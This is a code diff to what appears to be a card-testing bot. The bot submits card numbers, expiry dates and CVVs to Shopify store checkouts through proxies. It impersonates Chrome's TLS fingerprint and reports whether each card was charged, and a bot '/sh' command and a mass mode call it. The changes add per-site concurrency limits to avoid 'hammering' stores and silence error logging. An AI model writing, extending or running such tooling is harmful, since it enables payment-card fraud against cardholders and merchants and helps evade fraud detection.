@@ -21,6 +21,18 @@ except ImportError:
     _CURL_CFFI_AVAILABLE = False
     print("[CURL-CFFI] curl_cffi NOT installed — falling back to aiohttp (install with: pip install curl_cffi)")
 
+
+# Per-site concurrency limiter — max 5 workers per site simultaneously
+_site_sems = {}
+_site_sem_lock = threading.Lock()
+MAX_WORKERS_PER_SITE = 5
+
+def _get_site_sem(site_key):
+    with _site_sem_lock:
+        if site_key not in _site_sems:
+            _site_sems[site_key] = asyncio.Semaphore(MAX_WORKERS_PER_SITE)
+        return _site_sems[site_key]
+
 # Chrome impersonation target — use latest stable Chrome with strongest JA3
 _IMPERSONATE_TARGET = "chrome136"
 
@@ -1816,7 +1828,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         if cart_status not in (200, 201): print(f"{tag} [CART] aiohttp status={cart_status}")
                 except Exception as _e:
                     cart_status = 0
-                    print(f"{tag} [CART-DEBUG{attempt_label}] EXCEPTION: {type(_e).__name__}: {_e}")
+                    # SUPPRESSED: print(f"{tag} [CART-DEBUG{attempt_label}] EXCEPTION: {type(_e).__name__}: {_e}")
 
             # ── Attempt A: multipart/form-data — HAR-exact format ────────────
             # HAR shows: form_type, utf8, id, quantity, product-id, section-id, sections
@@ -3202,7 +3214,7 @@ def _write_mass_log(results):
 # Called by bot.py /sh handler
 # Returns dict with: Response, Message, Product, Price, Site, Charged, Gateway
 # ---------------------------------------------------------------------------
-async def check_card_native(cc, mm, yy, cvv, site_url=None, proxy_str=None, extra_sites=None):
+async def check_card_native(cc, mm, yy, cvv, site_url=None, proxy_str=None, extra_sites=None, mass_mode=False):
     """
     Bot-compatible wrapper around process_card.
     Returns a dict the bot's /sh handler expects.
@@ -3237,10 +3249,14 @@ async def check_card_native(cc, mm, yy, cvv, site_url=None, proxy_str=None, extr
 
     for _site in sites_to_try[:5]:
         try:
-            success, message, gateway, price, currency = await process_card(
-                cc, mm, yy, cvv, _site,
-                proxy_str=proxy_str
-            )
+            # Limit concurrent workers per site — prevents hammering
+            _site_key = _normalize_site_key(_site)
+            _sem = _get_site_sem(_site_key)
+            async with _sem:
+                success, message, gateway, price, currency = await process_card(
+                    cc, mm, yy, cvv, _site,
+                    proxy_str=proxy_str
+                )
         except Exception as e:
             success, message = False, str(e)[:120]
             gateway = "Shopify"
